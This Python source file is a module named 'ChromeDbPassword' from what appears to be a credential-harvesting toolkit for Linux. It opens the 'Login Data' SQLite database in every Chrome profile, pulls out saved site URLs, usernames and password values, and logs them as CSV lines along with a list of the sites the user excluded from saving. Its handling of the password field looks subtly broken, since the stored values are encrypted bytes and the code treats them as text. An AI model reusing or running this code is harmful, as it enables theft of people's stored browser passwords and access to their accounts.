# coding: utf-8

try:
	import os
	import sqlite3
	from urllib import parse
except ImportError:
	pass

from modules.linux.chrome.chrome_module import ChromeModule


class ChromeDbPassword(ChromeModule):
	def __init__(self):
		ChromeModule.__init__(
			self,
			name='ChromeDbPassword',
			version='0.1.0',
			file=__file__,
			dependencies=['os', 'sqlite3', 'urllib.parse'],
		)

	def can(self):
		return super().can()

	def has(self):
		return super().has()

	def execute(self) -> bool:
		if not super().execute():
			return False

		for profile in self.get_profiles():
			download_path = profile + '/Login Data'
			if os.path.isfile(download_path):
				self.log(profile.split('/')[-1] + ':')
				connection = sqlite3.connect(download_path)
				cursor = connection.cursor()
				try:
					cursor.execute('SELECT origin_url, username_value, password_value, date_created FROM logins WHERE blacklisted_by_user = 0')
				except sqlite3.OperationalError:
					self.executenot(download_path + ' database is locked', 1)
					return False

				self.log('hostname,username,password,created_date')
				for origin_url, username_value, password_value, date_created in cursor.fetchall():
					hostname_split = parse.urlsplit(origin_url)
					hostname = parse.urlunsplit((hostname_split.scheme, hostname_split.netloc, "", "", ""))
					self.log(hostname + ',' + username_value + ',' + password_value + ',' + str(date_created))

				cursor = connection.cursor()
				try:
					cursor.execute('SELECT origin_url, date_created FROM logins WHERE blacklisted_by_user = 1')
				except sqlite3.OperationalError:
					self.executenot(download_path + ' database is locked', 1)
					return False

				self.log('hostname,created_date,blacklisted')
				for origin_url, date_created in cursor.fetchall():
					hostname_split = parse.urlsplit(origin_url)
					hostname = parse.urlunsplit((hostname_split.scheme, hostname_split.netloc, "", "", ""))
					self.log(hostname + ',' + str(date_created) + ',blacklisted')

		return True